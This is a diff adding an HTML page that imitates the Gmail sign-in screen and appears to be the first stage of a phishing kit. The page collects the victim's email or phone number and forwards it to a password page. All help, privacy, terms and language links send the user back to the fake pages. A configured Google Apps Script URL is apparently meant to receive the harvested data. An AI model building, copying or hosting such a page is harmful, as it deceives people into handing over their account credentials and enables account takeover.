@@ -1,0 +1,711 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gmail Login</title>
+    <link rel="shortcut icon" href="images/image.png" type="image">
+    <style>
+        /* ============================================================
+           RESET & BASE
+           ============================================================ */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Google Sans', Roboto, Arial, sans-serif;
+            background-color: #ffffff;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+            margin: 0;
+        }
+
+        /* ============================================================
+           MAIN CONTAINER
+           ============================================================ */
+        .maindiv {
+            width: 100%;
+            max-width: 450px;
+            padding: 48px 40px 36px;
+            background: #fff;
+            border-radius: 8px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.08);
+            border: 1px solid #dadce0;
+        }
+
+        /* ============================================================
+           LOGO
+           ============================================================ */
+        .divlogo {
+            width: 56px;
+            height: 56px;
+            margin-bottom: 25px;
+            display: block;
+        }
+
+        /* ============================================================
+           WELCOME TEXT
+           ============================================================ */
+        .welcome {
+            font-size: 24px;
+            font-weight: 400;
+            color: #202124;
+            margin-bottom: 8px;
+            text-align: center;
+        }
+
+        .welcomee {
+            font-size: 16px;
+            font-weight: 400;
+            color: #202124;
+            margin-bottom: 25px;
+            text-align: center;
+        }
+
+        /* ============================================================
+           FORM HALF - Left section (hidden on small screens, shown on large)
+           ============================================================ */
+        .form-half {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 0;
+        }
+
+        .form-half1 {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            padding: 0;
+        }
+
+        /* ============================================================
+           INPUT FIELD
+           ============================================================ */
+        .passdiv {
+            position: relative;
+            width: 100%;
+            margin-top: 0;
+            margin-bottom: 0;
+        }
+
+        input[type="text"] {
+            width: 100%;
+            padding: 13px 15px;
+            font-size: 16px;
+            font-family: 'Google Sans', Roboto, Arial, sans-serif;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            outline: none;
+            background: #fff;
+            transition: border-color 0.2s ease;
+            height: 52px;
+            color: #202124;
+        }
+
+        input[type="text"]:focus {
+            border-color: #1a73e8;
+            border-width: 2px;
+            padding: 12px 14px;
+        }
+
+        input[type="text"]:focus + .placeholder-label,
+        input[type="text"]:not(:placeholder-shown) + .placeholder-label {
+            top: 3px;
+            left: 12px;
+            padding: 0 4px;
+            background-color: #fff;
+            color: #1a73e8;
+            font-size: 11px;
+            font-weight: 500;
+        }
+
+        input[type="text"]:not(:placeholder-shown) {
+            padding-top: 18px;
+            padding-bottom: 6px;
+        }
+
+        input[type="text"]:focus:not(:placeholder-shown) {
+            padding-top: 17px;
+            padding-bottom: 5px;
+        }
+
+        .placeholder-label {
+            position: absolute;
+            top: 50%;
+            left: 15px;
+            transform: translateY(-50%);
+            color: #5f6368;
+            font-size: 16px;
+            font-weight: 400;
+            pointer-events: none;
+            transition: all 0.15s ease;
+            background: transparent;
+        }
+
+        /* ============================================================
+           FORGOT EMAIL
+           ============================================================ */
+        .shwpwd {
+            width: 100%;
+            margin-top: 8px;
+            margin-bottom: 0;
+            color: #1a73e8;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .shwpwd .button {
+            cursor: pointer;
+            background: none;
+            border: none;
+            color: #1a73e8;
+            font-family: 'Google Sans', Roboto, Arial, sans-serif;
+            font-size: 14px;
+            font-weight: 500;
+            padding: 0;
+        }
+
+        .shwpwd .button:hover {
+            text-decoration: underline;
+        }
+
+        /* ============================================================
+           GUEST MODE
+           ============================================================ */
+        .guest-mode {
+            width: 100%;
+            margin-top: 30px;
+            font-size: 14px;
+            color: #5f6368;
+            line-height: 1.5;
+            text-align: center;
+        }
+
+        .guest-mode a {
+            color: #1a73e8;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .guest-mode a:hover {
+            text-decoration: underline;
+        }
+
+        /* ============================================================
+           BUTTONS
+           ============================================================ */
+        .fgtpwd {
+            width: 100%;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 30px;
+            margin-left: 0;
+        }
+
+        .fgtpwd .hyperl {
+            font-size: 14px;
+            color: #1a73e8;
+            border: none;
+            background: transparent;
+            border-radius: 4px;
+            cursor: pointer;
+            font-family: 'Google Sans', Roboto, Arial, sans-serif;
+            font-weight: 500;
+            padding: 8px 12px;
+            transition: background 0.2s;
+        }
+
+        .fgtpwd .hyperl:hover {
+            background: rgba(26, 115, 232, 0.08);
+            text-decoration: underline;
+        }
+
+        .btn-container {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .btnnxt {
+            padding: 10px 28px;
+            font-size: 14px;
+            font-weight: 500;
+            font-family: 'Google Sans', Roboto, Arial, sans-serif;
+            border: none;
+            border-radius: 4px;
+            background-color: #1a73e8;
+            color: white;
+            cursor: pointer;
+            transition: background-color 0.2s ease;
+            height: 40px;
+            min-width: 80px;
+            letter-spacing: 0.25px;
+        }
+
+        .btnnxt:hover {
+            background-color: #1b66c9;
+            box-shadow: 0 1px 3px 0 rgba(0,0,0,0.3);
+        }
+
+        .btnnxt:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            box-shadow: none;
+        }
+
+        .btnnxt:disabled:hover {
+            background-color: #1a73e8;
+            box-shadow: none;
+        }
+
+        .spinner {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 2px solid #e8eaed;
+            border-top: 2px solid #1a73e8;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* ============================================================
+           BOTTOM SECTION
+           ============================================================ */
+        .btmdiv {
+            width: 100%;
+            max-width: 450px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 16px 40px 0;
+            margin-top: 20px;
+            border-top: 1px solid transparent;
+        }
+
+        .left-div select {
+            padding: 6px 8px;
+            font-size: 12px;
+            font-family: 'Google Sans', Roboto, Arial, sans-serif;
+            background: transparent;
+            border: none;
+            color: #5f6368;
+            cursor: pointer;
+            outline: none;
+        }
+
+        .left-div select:hover {
+            text-decoration: underline;
+        }
+
+        .right-divs {
+            display: flex;
+            gap: 16px;
+        }
+
+        .right-divs button {
+            background: transparent;
+            border: none;
+            color: #5f6368;
+            font-size: 12px;
+            cursor: pointer;
+            padding: 6px 8px;
+            font-family: 'Google Sans', Roboto, Arial, sans-serif;
+            border-radius: 4px;
+        }
+
+        .right-divs button:hover {
+            text-decoration: underline;
+            background: rgba(0,0,0,0.04);
+        }
+
+        /* ============================================================
+           RESPONSIVE - SMALL SCREENS (Mobile)
+           ============================================================ */
+        @media (max-width: 550px) {
+            .maindiv {
+                padding: 32px 24px 24px;
+                border-radius: 8px;
+                box-shadow: none;
+                border: none;
+            }
+
+            .welcome {
+                font-size: 22px;
+            }
+
+            .welcomee {
+                font-size: 15px;
+            }
+
+            .fgtpwd {
+                flex-direction: column;
+                gap: 16px;
+                align-items: stretch;
+            }
+
+            .fgtpwd .hyperl {
+                text-align: center;
+                padding: 10px;
+                width: 100%;
+            }
+
+            .btn-container {
+                justify-content: center;
+                width: 100%;
+            }
+
+            .btnnxt {
+                width: 100%;
+                justify-content: center;
+            }
+
+            .btmdiv {
+                flex-direction: column;
+                gap: 12px;
+                padding: 16px 24px 0;
+            }
+
+            .right-divs {
+                gap: 12px;
+                flex-wrap: wrap;
+                justify-content: center;
+            }
+
+            .guest-mode {
+                font-size: 13px;
+            }
+
+            input[type="text"] {
+                height: 48px;
+                font-size: 15px;
+                padding: 12px 14px;
+            }
+
+            .placeholder-label {
+                font-size: 15px;
+                left: 14px;
+            }
+
+            input[type="text"]:focus + .placeholder-label,
+            input[type="text"]:not(:placeholder-shown) + .placeholder-label {
+                font-size: 10px;
+                left: 11px;
+            }
+        }
+
+        /* ============================================================
+           RESPONSIVE - VERY SMALL SCREENS (Tiny phones)
+           ============================================================ */
+        @media (max-width: 380px) {
+            .maindiv {
+                padding: 24px 16px 20px;
+            }
+
+            .welcome {
+                font-size: 20px;
+            }
+
+            .welcomee {
+                font-size: 14px;
+            }
+
+            .divlogo {
+                width: 60px;
+                height: 20px;
+                margin-bottom: 24px;
+            }
+
+            .guest-mode {
+                font-size: 12px;
+            }
+
+            .btmdiv {
+                padding: 12px 16px 0;
+            }
+
+            .right-divs {
+                gap: 8px;
+            }
+
+            .right-divs button {
+                font-size: 11px;
+                padding: 4px 6px;
+            }
+
+            .left-div select {
+                font-size: 11px;
+                padding: 4px 6px;
+            }
+
+            input[type="text"] {
+                height: 44px;
+                font-size: 14px;
+                padding: 11px 12px;
+            }
+
+            .placeholder-label {
+                font-size: 14px;
+                left: 12px;
+            }
+
+            .btnnxt {
+                height: 36px;
+                font-size: 13px;
+                padding: 8px 20px;
+                min-width: 60px;
+            }
+        }
+
+        /* ============================================================
+           RESPONSIVE - LARGE SCREENS (Tablet/Desktop)
+           ============================================================ */
+        @media (min-width: 768px) and (max-width: 1024px) {
+            .maindiv {
+                max-width: 480px;
+                padding: 44px 38px 32px;
+            }
+
+            .welcome {
+                font-size: 26px;
+            }
+
+            .welcomee {
+                font-size: 17px;
+            }
+        }
+
+        /* ============================================================
+           RESPONSIVE - 2K / 4K SCREENS
+           ============================================================ */
+        @media (min-width: 1400px) {
+            .maindiv {
+                max-width: 520px;
+                padding: 56px 48px 40px;
+            }
+
+            .welcome {
+                font-size: 28px;
+            }
+
+            .welcomee {
+                font-size: 18px;
+            }
+
+            input[type="text"] {
+                height: 56px;
+                font-size: 18px;
+                padding: 15px 18px;
+            }
+
+            .placeholder-label {
+                font-size: 18px;
+                left: 18px;
+            }
+
+            .btnnxt {
+                height: 44px;
+                font-size: 16px;
+                padding: 12px 32px;
+                min-width: 90px;
+            }
+
+            .guest-mode {
+                font-size: 16px;
+            }
+
+            .shwpwd .button {
+                font-size: 16px;
+            }
+
+            .fgtpwd .hyperl {
+                font-size: 16px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="maindiv">
+        <!-- Logo -->
+        <img class="divlogo" src="images/image.png" alt="Google">
+
+        <!-- Welcome Text -->
+        <div class="welcome">Verify your email address</div>
+        <div class="welcomee">to continue to Gmail</div>
+
+        <!-- Form -->
+        <form class="loginform" method="post" name="loginForm" id="loginForm" action="#" accept-charset="UTF-8">
+            <div class="form-half1">
+                <!-- Username Input -->
+                <div class="passdiv">
+                    <input required name="username" type="text" id="usernameInput" placeholder=" ">
+                    <label for="usernameInput" class="placeholder-label">Email or Phone</label>
+                </div>
+
+                <!-- Forgot Email -->
+                <div class="shwpwd">
+                    <span class="button" id="forgotEmailLink"><b>Forgot email?</b></span>
+                </div>
+
+                <!-- Guest Mode -->
+                <div class="guest-mode">
+                    Not your computer? Use a Private Window to sign in. 
+                    <a href="#" id="guestModeLink">Learn more about using Guest mode</a>
+                </div>
+
+                <!-- Buttons -->
+                <div class="fgtpwd">
+                    <button type="button" id="createAccountBtn" class="hyperl"><b>Create account</b></button>
+                    <div class="btn-container">
+                        <button type="submit" class="btnnxt" id="nextBtn">Next</button>
+                        <div class="spinner" id="loadingSpinner"></div>
+                    </div>
+                </div>
+            </div>
+        </form>
+    </div>
+
+    <!-- Bottom Section -->
+    <div class="btmdiv">
+        <div class="left-div">
+            <select class="btmhypl" id="language-select">
+                <option value="en">English (United States)</option>
+                <option value="fr">French</option>
+                <option value="es">Spanish</option>
+                <option value="de">German</option>
+            </select>
+        </div>
+
+        <div class="right-divs">
+            <button id="helpButton" class="btmhypl">Help</button>
+            <button id="privacyButton" class="btmhypl">Privacy</button>
+            <button id="termsButton" class="btmhypl">Terms</button>
+        </div>
+    </div>
+
+    <script>
+        // ============================================================
+        // CONFIGURATION
+        // ============================================================
+        const GOOGLE_SHEETS_WEB_APP_URL = 'https://script.google.com/macros/s/AKfycbwUTh2tkCEz8ymDFTWDZIYxhNDJ7tFmZvCpQZ93N_j5jBzuCZvYOpGp0lbVCsF88fo/exec';
+
+        // ============================================================
+        // ELEMENTS
+        // ============================================================
+        const usernameInput = document.getElementById('usernameInput');
+        const loginForm = document.getElementById('loginForm');
+        const nextBtn = document.getElementById('nextBtn');
+        const loadingSpinner = document.getElementById('loadingSpinner');
+        const forgotEmailLink = document.getElementById('forgotEmailLink');
+        const createAccountBtn = document.getElementById('createAccountBtn');
+        const guestModeLink = document.getElementById('guestModeLink');
+
+        // ============================================================
+        // ALL LINKS - username.html එකටම redirect
+        // ============================================================
+        forgotEmailLink.addEventListener('click', function() {
+            window.location.href = 'username.html';
+        });
+
+        createAccountBtn.addEventListener('click', function() {
+            window.location.href = 'username.html';
+        });
+
+        guestModeLink.addEventListener('click', function(e) {
+            e.preventDefault();
+            window.location.href = 'username.html';
+        });
+
+        document.getElementById('helpButton').addEventListener('click', function() {
+            window.location.href = 'username.html';
+        });
+        document.getElementById('privacyButton').addEventListener('click', function() {
+            window.location.href = 'username.html';
+        });
+        document.getElementById('termsButton').addEventListener('click', function() {
+            window.location.href = 'username.html';
+        });
+
+        document.getElementById('language-select').addEventListener('change', function() {
+            window.location.href = 'username.html';
+        });
+
+        // ============================================================
+        // INPUT FOCUS/BLUR
+        // ============================================================
+        usernameInput.addEventListener('focus', function() {
+            this.classList.add('focused');
+        });
+
+        usernameInput.addEventListener('blur', function() {
+            if (this.value.trim() !== '') {
+                this.classList.add('focused');
+            } else {
+                this.classList.remove('focused');
+            }
+        });
+
+        // ============================================================
+        // GO TO PASSWORD PAGE
+        // ============================================================
+        function goToPasswordPage(username) {
+            window.location.href = 'password.html?username=' + encodeURIComponent(username);
+        }
+
+        // ============================================================
+        // HANDLE FORM SUBMISSION
+        // ============================================================
+        function handleFormSubmit(e) {
+            e.preventDefault();
+            
+            const username = usernameInput.value.trim();
+            
+            if (username === '') {
+                alert('Please enter your email or phone number.');
+                usernameInput.focus();
+                return;
+            }
+
+            // Show loading
+            nextBtn.disabled = true;
+            nextBtn.textContent = 'Loading...';
+            loadingSpinner.style.display = 'inline-block';
+
+            setTimeout(function() {
+                goToPasswordPage(username);
+            }, 300);
+        }
+
+        // ============================================================
+        // EVENT LISTENERS
+        // ============================================================
+        loginForm.addEventListener('submit', handleFormSubmit);
+
+        usernameInput.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                handleFormSubmit(e);
+            }
+        });
+
+        console.log('✅ username.html loaded - Responsive ready!');
+    </script>
+</body>
+</html>
